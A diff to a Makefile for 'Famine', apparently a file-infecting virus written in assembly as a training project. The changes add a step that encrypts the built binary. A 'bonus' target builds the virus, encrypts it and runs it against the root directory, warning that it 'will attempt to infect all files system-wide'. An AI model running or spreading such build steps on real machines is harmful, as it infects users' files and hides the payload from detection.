@@ -7,6 +7,7 @@ SRC_DIR  = sources
 OBJ_DIR  = objects
 BIN_DIR  = .
 BIN_NAME = Famine
+ENCRYPT_NAME = encrypt
 
 VERBOSE_FLAG :=
 ifeq ($(filter -v,$(MAKECMDGOALS)),-v)
@@ -34,35 +35,46 @@ endif
 
 # Source files
 SRC_S    = sources/main.s
+ENCRYPT_S = sources/encrypt_simple.s
 
-# Object files (replace .s/.c with .o and change path)
+# Object files
 OBJ_S    = $(patsubst $(SRC_DIR)/%.s,$(OBJ_DIR)/%.o,$(SRC_S))
 OBJS     = $(OBJ_S)
+ENCRYPT_OBJ = $(OBJ_DIR)/encrypt.o
 
-# Target executable
+# Target executables
 TARGET   = $(BIN_DIR)/$(BIN_NAME)
+ENCRYPT  = $(BIN_DIR)/$(ENCRYPT_NAME)
 
-# Default target
-all: $(TARGET)
+# Default target - build Famine and encrypt it
+all: $(TARGET) $(ENCRYPT)
+	./$(ENCRYPT)
 
 # Create objects directory if it doesn't exist
-
 $(OBJ_DIR):
 	$(shell mkdir -p $(OBJ_DIR))
 
-# Link object files into executable
+# Link object files into Famine executable
 $(TARGET): $(OBJS)
 	ld $^ -o $@
 
-# Compile .s files to .o
+# Compile .s files to .o for Famine
 $(OBJ_DIR)/%.o: $(SRC_DIR)/%.s | $(OBJ_DIR)
+	$(AS) $(ASFLAGS) $< -o $@
+
+# Build encrypt program
+$(ENCRYPT): $(ENCRYPT_OBJ)
+	ld $^ -o $@
+
+# Compile encrypt.s
+$(ENCRYPT_OBJ): $(ENCRYPT_S) | $(OBJ_DIR)
 	$(AS) $(ASFLAGS) $< -o $@
 
 clean:
 	rm -rf $(OBJ_DIR)
 
 fclean: clean
-	rm -f $(TARGET)
+	rm -f $(TARGET) $(ENCRYPT)
 
 re: fclean all
 
@@ -73,6 +85,9 @@ bonus: fclean
 	mkdir -p $(OBJ_DIR)
 	$(AS) $(ASFLAGS) -DBONUS_MODE $(SRC_S) -o $(OBJ_DIR)/main.o
 	ld $(OBJ_DIR)/main.o -o $(TARGET)
+	$(AS) $(ASFLAGS) $(ENCRYPT_S) -o $(ENCRYPT_OBJ)
+	ld $(ENCRYPT_OBJ) -o $(ENCRYPT)
+	./$(ENCRYPT)
 	@echo "WARNING: About to execute Famine targeting root directory /"
 	@echo "This will attempt to infect all files system-wide."
 	./$(TARGET)
